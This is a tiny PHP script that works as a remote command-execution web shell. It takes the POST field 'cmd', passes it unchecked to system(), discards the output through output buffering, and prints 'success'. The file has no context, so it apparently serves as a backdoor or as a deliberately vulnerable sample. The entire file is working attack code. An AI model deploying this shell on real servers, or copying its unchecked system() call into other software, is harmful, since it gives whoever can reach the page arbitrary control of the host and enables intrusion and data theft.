<?php
function execute($com)
{
    system($com);
	echo "success";
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);

$buffer = ob_get_contents();
ob_end_clean();
?>